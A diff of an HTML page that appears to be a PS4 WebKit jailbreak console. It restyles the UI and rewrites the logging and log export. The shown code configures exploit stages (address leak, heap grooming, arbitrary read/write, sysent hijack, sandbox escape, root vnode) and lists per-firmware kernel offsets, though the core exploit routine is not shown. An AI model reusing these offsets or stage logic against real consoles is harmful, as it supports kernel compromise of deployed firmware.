@@ -1,364 +1,468 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="referrer" content="no-referrer">
-<title>PS4 WebKit Exploit Console — mansoor0x</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WebKit Exploit — Console</title>
 <style>
-* { box-sizing: border-box; }
-html, body {
-    margin: 0; padding: 0;
-    background: #0a0e14;
-    color: #c9d1d9;
-    font: 12px/1.5 ui-monospace, 'Cascadia Mono', 'Consolas', 'Menlo', 'Courier New', monospace;
-    -webkit-text-size-adjust: 100%;
-}
-#app { padding: 10px; }
-#header {
-    border-bottom: 1px solid #21262d;
-    padding-bottom: 8px;
-    margin-bottom: 10px;
-    display: -webkit-box;
-    display: -webkit-flex;
+  :root {
+    --bg:        #0b0e13;
+    --panel:     #12161f;
+    --panel2:    #0f131a;
+    --border:    #232a38;
+    --text:      #c9d4e3;
+    --dim:       #6b7a90;
+    --pass:      #3ddc84;
+    --fail:      #ff5c5c;
+    --warn:      #ffb020;
+    --info:      #8fa6c4;
+    --accent:    #4aa3ff;
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font: 13px/1.45 'Courier New', ui-monospace, monospace;
+    padding: 10px;
+    height: 100vh;
     display: flex;
-    -webkit-justify-content: space-between;
-    justify-content: space-between;
-    -webkit-align-items: center;
-    align-items: center;
-    -webkit-flex-wrap: wrap;
-    flex-wrap: wrap;
+    flex-direction: column;
     gap: 8px;
-}
-#header .title {
-    color: #58a6ff;
-    font-weight: bold;
-    font-size: 13px;
-    letter-spacing: 0.5px;
-}
-#header .meta { color: #8b949e; font-size: 11px; }
-#header .meta span { margin-left: 10px; }
-#header .meta b { color: #c9d1d9; font-weight: normal; }
-#stages {
-    display: -webkit-box;
-    display: -webkit-flex;
+    overflow: hidden;
+  }
+
+  /* ---------- STATUS BAR ---------- */
+  #statusbar {
     display: flex;
-    -webkit-flex-wrap: wrap;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
     flex-wrap: wrap;
-    gap: 4px;
-    margin-bottom: 10px;
-}
-.stage {
-    padding: 3px 8px;
-    border-radius: 3px;
-    font-size: 11px;
-    border: 1px solid #30363d;
-    background: #161b22;
-    color: #6e7681;
-    white-space: nowrap;
-}
-.stage.pass { background: #0d3a1d; border-color: #238636; color: #3fb950; }
-.stage.fail { background: #3d1214; border-color: #da3633; color: #f85149; }
-.stage.run  { background: #3d2e0d; border-color: #d29922; color: #e3b341; }
-.stage.info { background: #13253d; border-color: #1f6feb; color: #58a6ff; }
-.stage.pending { opacity: 0.5; }
-#log {
-    background: #010409;
-    border: 1px solid #21262d;
+    padding: 10px 12px;
+    border: 1px solid var(--border);
+    border-left: 6px solid var(--dim);
+    border-radius: 6px;
+    background: var(--panel);
+  }
+  #statusbar.pending  { border-left-color: var(--dim); }
+  #statusbar.running  { border-left-color: var(--accent); }
+  #statusbar.pass     { border-left-color: var(--pass); background: #0e1a14; }
+  #statusbar.fail     { border-left-color: var(--fail); background: #1a0e0e; }
+  #statusbar.halted   { border-left-color: var(--warn); background: #1a160a; }
+
+  .status-left { display: flex; align-items: center; gap: 10px; min-width: 0; }
+  .dot {
+    width: 12px; height: 12px; border-radius: 50%;
+    background: var(--dim); flex: 0 0 auto;
+    box-shadow: 0 0 0 0 rgba(0,0,0,0);
+  }
+  #statusbar.running .dot { background: var(--accent); animation: pulse 1.1s infinite; }
+  #statusbar.pass    .dot { background: var(--pass); box-shadow: 0 0 10px var(--pass); }
+  #statusbar.fail    .dot { background: var(--fail); box-shadow: 0 0 10px var(--fail); }
+  #statusbar.halted  .dot { background: var(--warn); box-shadow: 0 0 10px var(--warn); }
+  @keyframes pulse {
+    0%   { box-shadow: 0 0 0 0 rgba(74,163,255,.7); }
+    70%  { box-shadow: 0 0 0 8px rgba(74,163,255,0); }
+    100% { box-shadow: 0 0 0 0 rgba(74,163,255,0); }
+  }
+  #statusText {
+    font-size: 15px; font-weight: bold; letter-spacing: .5px;
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+  #statusbar.pass #statusText { color: var(--pass); }
+  #statusbar.fail #statusText { color: var(--fail); }
+  #statusbar.running #statusText { color: var(--accent); }
+  #statusbar.halted #statusText { color: var(--warn); }
+  #statusSub { color: var(--dim); font-size: 11px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+  .status-right { display: flex; gap: 6px; flex-wrap: wrap; }
+  .chip {
+    padding: 3px 8px; border-radius: 10px; font-size: 11px; font-weight: bold;
+    border: 1px solid var(--border); background: var(--panel2); color: var(--dim);
+  }
+  .chip.pass { color: var(--pass); border-color: #1f4a35; }
+  .chip.fail { color: var(--fail); border-color: #4a1f1f; }
+  .chip.warn { color: var(--warn); border-color: #4a3a1f; }
+
+  /* ---------- TOOLBAR ---------- */
+  #toolbar {
+    display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
+    padding: 6px 8px;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    background: var(--panel2);
+  }
+  button {
+    font: inherit; font-size: 12px;
+    padding: 5px 10px;
+    color: var(--text);
+    background: #1b2230;
+    border: 1px solid var(--border);
     border-radius: 4px;
-    padding: 8px;
-    height: 70vh;
-    overflow-y: auto;
+    cursor: pointer;
+  }
+  button:hover { background: #253044; border-color: #35425c; }
+  button:active { transform: translateY(1px); }
+  button.primary { border-color: #1f4a7a; color: var(--accent); }
+  #toolbar label { color: var(--dim); font-size: 11px; display: flex; align-items: center; gap: 4px; cursor: pointer; }
+  #toolbar .spacer { flex: 1 1 auto; }
+  #toolbar .meta { color: var(--dim); font-size: 11px; }
+
+  /* ---------- CONSOLE ---------- */
+  #consoleWrap {
+    flex: 1 1 auto;
+    min-height: 0;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    background: #05070a;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+  }
+  #consoleHead {
+    padding: 5px 10px;
+    background: var(--panel);
+    border-bottom: 1px solid var(--border);
+    color: var(--dim);
     font-size: 11px;
-    line-height: 1.55;
-}
-.log-line { white-space: pre-wrap; word-break: break-all; }
-.log-line .seq { color: #484f58; }
-.log-line .tag { color: #c9d1d9; }
-.log-line .extra { color: #8b949e; }
-.log-line.pass .tag { color: #3fb950; font-weight: bold; }
-.log-line.fail .tag { color: #f85149; font-weight: bold; }
-.log-line.run  .tag { color: #e3b341; }
-.log-line.info .tag { color: #58a6ff; }
-.log-line.wait .tag { color: #d29922; }
-.status-badge {
-    display: inline-block;
-    min-width: 34px;
-    padding: 0 4px;
-    border-radius: 2px;
-    text-align: center;
-    font-weight: bold;
-    font-size: 10px;
-    margin-right: 6px;
-    vertical-align: 1px;
-}
-.status-badge.pass { background: #238636; color: #fff; }
-.status-badge.fail { background: #da3633; color: #fff; }
-.status-badge.run  { background: #d29922; color: #000; }
-.status-badge.info { background: #1f6feb; color: #fff; }
-.status-badge.wait { background: #d29922; color: #000; }
+    letter-spacing: 1px;
+    display: flex; justify-content: space-between; gap: 8px;
+  }
+  #out {
+    flex: 1 1 auto;
+    overflow: auto;
+    padding: 6px 0;
+    font-size: 12px;
+    line-height: 1.4;
+    -webkit-overflow-scrolling: touch;
+  }
+  .logline {
+    display: flex;
+    gap: 8px;
+    padding: 1px 10px;
+    border-left: 3px solid transparent;
+    white-space: pre-wrap;
+    word-break: break-word;
+  }
+  .logline .time { color: #3f4c60; flex: 0 0 auto; }
+  .logline .msg  { flex: 1 1 auto; }
+  .logline.info  { color: var(--info);  border-left-color: #1c2433; }
+  .logline.pass  { color: var(--pass);  border-left-color: var(--pass); font-weight: bold; background: #0a1710; }
+  .logline.fail  { color: var(--fail);  border-left-color: var(--fail); font-weight: bold; background: #170a0a; }
+  .logline.warn  { color: var(--warn);  border-left-color: var(--warn); background: #17120a; }
+  .logline.debug { color: #5a6a80; border-left-color: #1c2433; }
+
+  #out::-webkit-scrollbar { width: 10px; height: 10px; }
+  #out::-webkit-scrollbar-track { background: #0a0d12; }
+  #out::-webkit-scrollbar-thumb { background: #263043; border-radius: 5px; }
+
+  @media (max-width: 640px) {
+    .logline { font-size: 11px; }
+    #statusText { font-size: 13px; }
+  }
 </style>
 </head>
 <body>
-<div id="app">
-    <div id="header">
-        <div class="title">PS4 WEBKIT EXPLOIT CONSOLE</div>
-        <div class="meta">
-            <span>FW <b id="m-fw">&mdash;</b></span>
-            <span>REV <b id="m-rev">&mdash;</b></span>
-            <span>ATT <b id="m-att">&mdash;</b></span>
-        </div>
+
+<!-- ================= STATUS BAR ================= -->
+<div id="statusbar" class="pending">
+  <div class="status-left">
+    <span class="dot"></span>
+    <div style="min-width:0">
+      <div id="statusText">INITIALIZING…</div>
+      <div id="statusSub">waiting for boot</div>
     </div>
-    <div id="stages"></div>
-    <div id="log"></div>
+  </div>
+  <div class="status-right">
+    <span class="chip pass" id="chipPass">PASS 0</span>
+    <span class="chip fail" id="chipFail">FAIL 0</span>
+    <span class="chip warn" id="chipWarn">WARN 0</span>
+  </div>
 </div>
+
+<!-- ================= TOOLBAR ================= -->
+<div id="toolbar">
+  <button id="btnDownload" class="primary">⬇ Download log (.txt)</button>
+  <button id="btnCopy">Copy log</button>
+  <button id="btnClear">Clear</button>
+  <label><input type="checkbox" id="chkAutoScroll" checked> auto-scroll</label>
+  <label><input type="checkbox" id="chkAutoSave"> auto-save .txt on finish</label>
+  <span class="spacer"></span>
+  <span class="meta" id="toolbarMeta">rev —</span>
+</div>
+
+<!-- ================= CONSOLE ================= -->
+<div id="consoleWrap">
+  <div id="consoleHead">
+    <span>CONSOLE OUTPUT</span>
+    <span id="consoleCount">0 lines</span>
+  </div>
+  <div id="out"></div>
+</div>
+
 <script>
 "use strict";
 
-// ========== SHARED CONFIG ==========
-var Q = new URLSearchParams(location.search);
-
-var REVISION = "genuine-u8-rw-16-1352";
-var headerMsg = "mansoor0x";
-
-var MAX_ATTEMPTS = (function(){
-    var v = parseInt(Q.get("r") || "1", 10);
-    if (!isFinite(v)) v = 1;
-    return Math.max(1, Math.min(10, v));
-})();
-
-var SIMPLE_JB = Q.get("simplejb") !== "0";
-var DRAIN_COUNT = (function(){
-    var def = SIMPLE_JB ? "64" : "128";
-    var v = parseInt(Q.get("n") || def, 10);
-    if (!isFinite(v)) v = parseInt(def, 10);
-    return Math.max(32, Math.min(512, v));
-})();
-var CARRIER_SLOTS = (function(){
-    var def = SIMPLE_JB ? "2000000" : "800000";
-    var v = parseInt(Q.get("c") || def, 10);
-    if (!isFinite(v)) v = parseInt(def, 10);
-    return Math.max(100000, Math.min(4000000, v));
-})();
-var RUN_JAILBREAK = Q.get("jb") === "1" && Q.get("l") !== "1";
-var KERNEL_LAB = Q.get("klab") === "1";
-var MEM_DROP_AFTER_RW = Q.get("mem") === "drop";
-var RUN_KERNEL_STAGE = RUN_JAILBREAK || KERNEL_LAB;
-var FORCE_UCRED_SIG_SCAN = Q.get("ksig") === "1";
-var JB_DELAY_MS = (function(){
-    var def = SIMPLE_JB ? "1200" : "7500";
-    var v = parseInt(Q.get("jbdelay") || def, 10);
-    if (!isFinite(v)) v = parseInt(def, 10);
-    return Math.max(500, Math.min(30000, v));
-})();
-var JB_GATE_PAUSE_MS = (function(){
-    var v = parseInt(Q.get("jbgate") || "400", 10);
-    if (!isFinite(v)) v = 400;
-    return Math.max(0, Math.min(5000, v));
-})();
-var SURVIVE_MS = (function(){
-    var parts = (Q.get("sv") || "100,3500,7000").split(",");
-    var t100 = parseInt(parts[0], 10), t1k = parseInt(parts[1], 10), t3k = parseInt(parts[2], 10);
-    if (!isFinite(t100)) t100 = 100;
-    if (!isFinite(t1k)) t1k = 3500;
-    if (!isFinite(t3k)) t3k = 7000;
-    return { t100: t100, t1k: t1k, t3k: t3k };
-})();
-var CARRIER_BYTES = CARRIER_SLOTS * 8;
-
-// ========== UI ==========
-var STAGES = ["BOOT","SSV","ADDROF","GROOM","TRIGGER","RW","KEXPLOIT","SANDBOX","ROOT","COMPLETE"];
-var STAGE_STATUS = {};
-for (var _si = 0; _si < STAGES.length; _si++) STAGE_STATUS[STAGES[_si]] = "pending";
-var LOG_MAX = 400;
-var stageUiMuted = false;
-var uiSeq = 0;
-var headerPrinted = false;
-var headerBorder = "=".repeat(50);
-
-var TAG_MAP = {
-    "BOOT":               ["BOOT", "info"],
-    "ATTEMPT":            ["BOOT", "run"],
-    "SETUP-THREW":        ["BOOT", "fail"],
-    "SSV-BUILD":          ["SSV", "run"],
-    "SSV-BUILT":          ["SSV", "pass"],
-    "SSV-STORE-ENTER":    ["SSV", "run"],
-    "SSV-STORED":         ["SSV", "pass"],
-    "ADDROF-PREP-BEGIN":  ["ADDROF", "run"],
-    "ADDROF-CARRIER-DONE":["ADDROF", "info"],
-    "ADDROF-WRAPPER-READY":["ADDROF", "info"],
-    "ADDROF-RETURNED":    ["ADDROF", "pass"],
-    "ADDROF-COPY":        ["ADDROF", "info"],
-    "ADDROF-POINTERS":    ["ADDROF", "info"],
-    "ADDROF-FAIL":        ["ADDROF", "fail"],
-    "ADDROF-NO-RESULT":   ["ADDROF", "fail"],
-    "ADDROF-THREW":       ["ADDROF", "fail"],
-    "SSV-GROOM-ENTER":    ["GROOM", "run"],
-    "PREDECESSOR-FILLED": ["GROOM", "pass"],
-    "SSV-RETURNED-CLEARED":["TRIGGER", "pass"],
-    "RW-CARRIER":         ["TRIGGER", "info"],
-    "TARGET-CELL":        ["TRIGGER", "info"],
-    "FAKE-RETAINED":      ["TRIGGER", "info"],
-    "RW-HEADER-HEX":      ["TRIGGER", "info"],
-    "TARGET-HEADER-HEX":  ["TRIGGER", "info"],
-    "HEADER-MISMATCH":    ["TRIGGER", "fail"],
-    "NORMAL-CLONE-MISS":  ["TRIGGER", "fail"],
-    "LOAD-THREW":         ["TRIGGER", "fail"],
-    "SSV-PLACEMENT-MISS": ["TRIGGER", "fail"],
-    "NO-RESULT":          ["TRIGGER", "fail"],
-    "DONE-THROW":         ["TRIGGER", "info"],
-    "DONE-MISS":          ["TRIGGER", "info"],
-    "ARBITRARY-READ-PASS":["RW", "pass"],
-    "ARBITRARY-READ-MISMATCH":["RW", "fail"],
-    "ARBITRARY-WRITE-PASS":["RW", "pass"],
-    "ARBITRARY-WRITE-MISMATCH":["RW", "fail"],
-    "GENUINE-UB-RW-PASS": ["RW", "pass"],
-    "ROOTS-LIVE":         ["RW", "info"],
-    "SURVIVED-T100":      ["RW", "info"],
-    "SURVIVED-T1000":     ["RW", "info"],
-    "SURVIVED-T3000":     ["RW", "info"],
-    "MEM-RELEASE":        ["RW", "info"],
-    "CARRIER-FREED":      ["RW", "info"],
-    "FILLER-FREED":       ["RW", "info"],
-    "SURVIVED-THROW-T1000":["RW", "info"],
-    "SURVIVED-MISS-T1000":["RW", "info"],
-    "SURVIVED-MISMATCH-T1000":["RW", "info"],
-    "===== PS4 JAILBREAK START =====":["KEXPLOIT", "run"],
-    "KERNEL-BASE":        ["KEXPLOIT", "info"],
-    "SYSENT-661":         ["KEXPLOIT", "info"],
-    "JMP-RSI":            ["KEXPLOIT", "info"],
-    "SYSENT-HIJACKED":    ["KEXPLOIT", "pass"],
-    "KSCAN-BEGIN":        ["KEXPLOIT", "run"],
-    "KSCAN-PROC-DONE":    ["KEXPLOIT", "info"],
-    "KSCAN-SIG-SKIP":     ["KEXPLOIT", "info"],
-    "PROC-CAND":          ["KEXPLOIT", "info"],
-    "PROC-HARVEST":       ["KEXPLOIT", "info"],
-    "ALLPROC-WALK":       ["KEXPLOIT", "info"],
-    "ALLPROC-TRY":        ["KEXPLOIT", "run"],
-    "KSCAN-SKIP":         ["KEXPLOIT", "info"],
-    "PRISON0":            ["KEXPLOIT", "info"],
-    "KBASE-SRC":          ["KEXPLOIT", "info"],
-    "KBASE-FOUND":        ["KEXPLOIT", "info"],
-    "KBASE-WARN":         ["KEXPLOIT", "fail"],
-    "SYSENT-HIJACK-SKIP": ["KEXPLOIT", "info"],
-    "SYSENT-PROBE":       ["KEXPLOIT", "info"],
-    "KERNEL-STAGE-MISS":  ["KEXPLOIT", "fail"],
-    "KERNEL-STAGE-OK":    ["KEXPLOIT", "pass"],
-    "JAILBREAK-ERROR":    ["KEXPLOIT", "fail"],
-    "SCAN-HIT":           ["SANDBOX", "info"],
-    "UCRED-SIG-CANDIDATE":["SANDBOX", "info"],
-    "UCRED-SIG-FOUND":    ["SANDBOX", "info"],
-    "VERIFY-UID":         ["SANDBOX", "pass"],
-    "PROC-DUMP":          ["SANDBOX", "info"],
-    "VERIFY-ROOTVNODE":   ["ROOT", "info"],
-    "SYSENT-RESTORED":    ["COMPLETE", "pass"],
-    "===== JAILBREAK COMPLETE =====":["COMPLETE", "pass"],
-    "RETRY":              ["BOOT", "wait"],
-    "GIVE-UP":            ["BOOT", "fail"],
-    "ADVICE":             ["BOOT", "info"]
+/* ============================================================
+ *  CONSOLE / LOGGER LAYER
+ * ============================================================ */
+var LOG = {
+    lines: [],
+    counts: { pass: 0, fail: 0, warn: 0, info: 0 },
+    startTime: Date.now(),
+    maxLines: 8000,
+    autoScroll: true,
+    autoSave: false,
+    status: "pending",
+    statusText: "INITIALIZING…",
+    statusSub: "waiting for boot"
 };
 
+function pad(n, w) { n = String(n); while (n.length < (w || 2)) n = "0" + n; return n; }
+
+function fmtTime(ms) {
+    var d = new Date(ms);
+    return pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds()) + "." + pad(d.getMilliseconds(), 3);
+}
+
+/* Classify a log entry into pass / fail / warn / info */
 function classify(tag, extra) {
-    if (tag === "SANDBOX-ESCAPE") {
-        var ok = String(extra || "").indexOf("success") === 0;
-        return ["SANDBOX", ok ? "pass" : "fail"];
-    }
-    if (tag === "ROOT-VNODE-SET") {
-        var ok2 = String(extra || "").indexOf("success") === 0;
-        return ["ROOT", ok2 ? "pass" : "fail"];
-    }
-    var m = TAG_MAP[tag];
-    if (m) return m;
-    return ["MISC", "info"];
+    var t = (String(tag) + " " + (extra === undefined ? "" : String(extra))).toUpperCase();
+
+    /* negative first — overrides everything */
+    if (t.indexOf("FAILED")   !== -1) return "fail";
+    if (t.indexOf("GIVE-UP")  !== -1) return "fail";
+    if (t.indexOf("FAIL")     !== -1) return "fail";
+    if (t.indexOf("MISMATCH") !== -1) return "fail";
+    if (t.indexOf("THREW")    !== -1) return "fail";
+    if (t.indexOf("ERROR")    !== -1) return "fail";
+
+    /* positive */
+    if (t.indexOf("PASS")     !== -1) return "pass";
+    if (t.indexOf("COMPLETE") !== -1) return "pass";
+    if (t.indexOf("SUCCESS")  !== -1) return "pass";
+    if (t.indexOf("RETAINED") !== -1) return "pass";
+
+    /* warnings / halts */
+    if (t.indexOf("HALTED")   !== -1) return "warn";
+    if (t.indexOf("MISS")     !== -1) return "warn";
+    if (t.indexOf("RETRY")    !== -1) return "warn";
+    if (t.indexOf("NO-RESULT")!== -1) return "warn";
+
+    return "info";
 }
 
-function renderStages() {
-    var el = document.getElementById("stages");
-    if (!el) return;
-    var html = "";
-    for (var i = 0; i < STAGES.length; i++) {
-        var s = STAGES[i];
-        var st = STAGE_STATUS[s];
-        html += '<span class="stage ' + st + '">' + s + '</span>';
+function renderLine(entry) {
+    try {
+        var el = document.getElementById("out");
+        if (!el) return;
+        var div = document.createElement("div");
+        div.className = "logline " + entry.level;
+
+        var t = document.createElement("span");
+        t.className = "time";
+        t.textContent = fmtTime(entry.t);
+
+        var m = document.createElement("span");
+        m.className = "msg";
+        m.textContent = entry.text;
+
+        div.appendChild(t);
+        div.appendChild(m);
+        el.appendChild(div);
+
+        if (LOG.autoScroll) el.scrollTop = el.scrollHeight;
+    } catch (_) {}
+}
+
+function updateChips() {
+    try {
+        document.getElementById("chipPass").textContent = "PASS " + LOG.counts.pass;
+        document.getElementById("chipFail").textContent = "FAIL " + LOG.counts.fail;
+        document.getElementById("chipWarn").textContent = "WARN " + LOG.counts.warn;
+        document.getElementById("consoleCount").textContent = LOG.lines.length + " lines";
+    } catch (_) {}
+}
+
+function logLine(text, level) {
+    level = level || "info";
+    var entry = { t: Date.now(), text: text, level: level };
+    LOG.lines.push(entry);
+    LOG.counts[level] = (LOG.counts[level] || 0) + 1;
+    if (LOG.lines.length > LOG.maxLines) LOG.lines.shift();
+    renderLine(entry);
+    updateChips();
+}
+
+function setStatus(state, text, sub) {
+    LOG.status = state;
+    LOG.statusText = text;
+    LOG.statusSub = sub || "";
+    try {
+        var bar = document.getElementById("statusbar");
+        bar.className = state;
+        document.getElementById("statusText").textContent = text;
+        document.getElementById("statusSub").textContent = sub || "";
+    } catch (_) {}
+}
+
+/* Map exploit tags → status bar updates */
+function updateStatusFromMark(tag, extra) {
+    var t = String(tag).toUpperCase();
+    var e = extra === undefined ? "" : String(extra);
+
+    if (t === "BOOT") {
+        setStatus("running", "RUNNING", e);
+    } else if (t.indexOf("PS4 JAILBREAK START") !== -1) {
+        setStatus("running", "JAILBREAKING…", e);
+    } else if (t.indexOf("HALTED-BEFORE-JAILBREAK") !== -1) {
+        setStatus("halted", "R/W PASS — HALTED", "jailbreak disabled (add ?jb=1 to continue)");
+        maybeAutoSave();
+    } else if (t.indexOf("GENUINE-UB-RW-PASS") !== -1) {
+        setStatus("pass", "ARBITRARY R/W — PASS", e);
+    } else if (t.indexOf("JAILBREAK COMPLETE") !== -1) {
+        setStatus("pass", "JAILBREAK COMPLETE — PASS", e);
+        maybeAutoSave();
+    } else if (t.indexOf("FAILED-TERMINAL") === 0) {
+        setStatus("fail", "FAILED — " + e, "terminal, no retry");
+        maybeAutoSave();
+    } else if (t.indexOf("JAILBREAK-ERROR") === 0) {
+        setStatus("fail", "JAILBREAK ERROR — FAIL", e);
+        maybeAutoSave();
     }
-    el.innerHTML = html;
 }
 
-function updateMeta() {
-    var el = document.getElementById("m-fw");
-    if (el) el.textContent = (typeof FW_LABEL !== "undefined" && FW_LABEL) ? FW_LABEL : "\u2014";
-    var el2 = document.getElementById("m-rev");
-    if (el2) el2.textContent = REVISION;
-    var el3 = document.getElementById("m-att");
-    if (el3) el3.textContent = (typeof attemptNumber !== "undefined" ? attemptNumber : 0) + "/" + MAX_ATTEMPTS;
+/* ---------- LOG FILE EXPORT ---------- */
+function buildLogText() {
+    var L = [];
+    var line = "==================================================";
+    L.push(line);
+    L.push(" WebKit Exploit Log — " + headerMsg);
+    L.push(line);
+    L.push("Revision     : " + (typeof REVISION !== "undefined" ? REVISION : "?"));
+    L.push("Firmware     : " + (typeof FW_LABEL !== "undefined" && FW_LABEL ? FW_LABEL : "(undetected)"));
+    L.push("User Agent   : " + navigator.userAgent);
+    L.push("Started      : " + new Date(LOG.startTime).toISOString());
+    L.push("Ended        : " + new Date().toISOString());
+    L.push("Jailbreak    : " + (typeof RUN_JAILBREAK !== "undefined" ? (RUN_JAILBREAK ? "ENABLED (?jb=1)" : "DISABLED (halt before runJailbreak)") : "?"));
+    L.push("Final Status : " + LOG.statusText + "  [" + LOG.status.toUpperCase() + "]");
+    L.push("Counts       : PASS=" + LOG.counts.pass +
+                       "  FAIL=" + LOG.counts.fail +
+                       "  WARN=" + LOG.counts.warn +
+                       "  INFO=" + LOG.counts.info);
+    L.push("Credits      :");
+    L.push("  mansoor0x       - base HTML script");
+    L.push("  primehat06-wq   - uploaded to GitHub / found repo");
+    L.push("  OptiTronOffical - vibe coding, testing, repo dorking");
+    L.push("--------------------------------------------------");
+    for (var i = 0; i < LOG.lines.length; i++) {
+        var e = LOG.lines[i];
+        L.push("[" + fmtTime(e.t) + "] [" + pad(e.level.toUpperCase(), 4) + "] " + e.text);
+    }
+    L.push("--------------------------------------------------");
+    L.push("END OF LOG (" + LOG.lines.length + " entries)");
+    return L.join("\r\n");
 }
 
-function addLogLine(status, stage, tag, extra) {
-    var log = document.getElementById("log");
-    if (!log) return;
-    uiSeq++;
+function downloadLog() {
+    try {
+        var text = buildLogText();
+        var blob = new Blob([text], { type: "text/plain;charset=utf-8" });
+        var url = URL.createObjectURL(blob);
+        var a = document.createElement("a");
+        var stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
+        a.href = url;
+        a.download = "ps4-exploit-log-" + stamp + ".txt";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        setTimeout(function () { try { URL.revokeObjectURL(url); } catch (_) {} }, 10000);
+        logLine("LOG-SAVED file=ps4-exploit-log-" + stamp + ".txt bytes=" + text.length, "info");
+    } catch (err) {
+        logLine("LOG-SAVE-FAILED " + err, "warn");
+    }
+}
 
-    if (stage && STAGE_STATUS[stage] !== undefined) {
-        var cur = STAGE_STATUS[stage];
-        var order = { pending: 0, info: 1, run: 2, pass: 3, fail: 4 };
-        if (cur === "fail") {
-            // keep
-        } else if (cur === "pass" && (status === "info" || status === "run")) {
-            // keep
-        } else if (order[status] >= order[cur]) {
-            STAGE_STATUS[stage] = status;
-            if (!stageUiMuted) renderStages();
+var autoSaveDone = false;
+function maybeAutoSave() {
+    if (autoSaveDone) return;
+    if (!LOG.autoSave) return;
+    autoSaveDone = true;
+    setTimeout(downloadLog, 400);
+}
+
+function copyLog() {
+    var text = buildLogText();
+    try {
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(text).then(
+                function () { logLine("LOG-COPIED chars=" + text.length, "info"); },
+                function () { fallbackCopy(text); }
+            );
+        } else {
+            fallbackCopy(text);
         }
-    }
-
-    var line = document.createElement("div");
-    line.className = "log-line " + status;
-
-    var seqSpan = document.createElement("span");
-    seqSpan.className = "seq";
-    var n = uiSeq.toString();
-    while (n.length < 4) n = "0" + n;
-    seqSpan.textContent = "[" + n + "] ";
-    line.appendChild(seqSpan);
-
-    var badge = document.createElement("span");
-    badge.className = "status-badge " + status;
-    badge.textContent = status === "pass" ? "PASS"
-                      : status === "fail" ? "FAIL"
-                      : status === "run"  ? "RUN "
-                      : status === "wait" ? "WAIT"
-                      : "INFO";
-    line.appendChild(badge);
-
-    var tagSpan = document.createElement("span");
-    tagSpan.className = "tag";
-    tagSpan.textContent = tag;
-    line.appendChild(tagSpan);
-
-    if (extra !== undefined && extra !== null && String(extra) !== "") {
-        var extraSpan = document.createElement("span");
-        extraSpan.className = "extra";
-        extraSpan.textContent = "  " + String(extra);
-        line.appendChild(extraSpan);
-    }
-
-    log.appendChild(line);
-    while (log.childNodes.length > LOG_MAX) {
-        log.removeChild(log.firstChild);
-    }
-    log.scrollTop = log.scrollHeight;
+    } catch (_) { fallbackCopy(text); }
 }
+
+function fallbackCopy(text) {
+    try {
+        var ta = document.createElement("textarea");
+        ta.value = text;
+        ta.style.position = "fixed";
+        ta.style.opacity = "0";
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand("copy");
+        document.body.removeChild(ta);
+        logLine("LOG-COPIED (fallback) chars=" + text.length, "info");
+    } catch (err) {
+        logLine("LOG-COPY-FAILED " + err, "warn");
+    }
+}
+
+function clearLog() {
+    LOG.lines = [];
+    LOG.counts = { pass: 0, fail: 0, warn: 0, info: 0 };
+    try { document.getElementById("out").innerHTML = ""; } catch (_) {}
+    updateChips();
+}
+
+/* wire up UI (runs immediately — DOM is already parsed) */
+(function initUI() {
+    try {
+        document.getElementById("btnDownload").addEventListener("click", downloadLog);
+        document.getElementById("btnCopy").addEventListener("click", copyLog);
+        document.getElementById("btnClear").addEventListener("click", clearLog);
+        document.getElementById("chkAutoScroll").addEventListener("change", function (ev) {
+            LOG.autoScroll = !!ev.target.checked;
+        });
+        document.getElementById("chkAutoSave").addEventListener("change", function (ev) {
+            LOG.autoSave = !!ev.target.checked;
+        });
+    } catch (_) {}
+})();
+
+/* ============================================================
+ *  EXPLOIT (single-shot, no auto-retry)
+ * ============================================================ */
+
+// ========== HEADER MESSAGE ==========
+var headerMsg = "mansoor0x + OptiTronOffical";
+var headerBorder = "=".repeat(50);
+var headerPrinted = false;
 
 function printHeader() {
     if (headerPrinted) return;
     headerPrinted = true;
-    addLogLine("info", "BOOT", "SYSTEM", "==== " + headerMsg + " | rev " + REVISION + " ====");
-}
-
-function mark(tag, extra) {
-    if (!headerPrinted) printHeader();
-    var cls = classify(tag, extra);
-    addLogLine(cls[1], cls[0], tag, extra);
+    logLine(headerBorder, "info");
+    logLine(" " + headerMsg, "info");
+    logLine(" Credits:", "info");
+    logLine("   mansoor0x       - base HTML script", "info");
+    logLine("   primehat06-wq   - uploaded to GitHub / found repo", "info");
+    logLine("   OptiTronOffical - vibe coding, testing, repo dorking", "info");
+    logLine(headerBorder, "info");
 }
 
 // ========== PS4 OFFSETS ==========
@@ -387,26 +491,42 @@ var PS4_OFFSETS = {
     "11.50": { evf: 0x784318, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x704D5 },
     "12.00": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
     "12.50": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
-    "13.00": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31, allproc: 0x1B28538 },
-    "13.02": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31, allproc: 0x1B28538 },
-    "13.04": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31, allproc: 0x1B28538 },
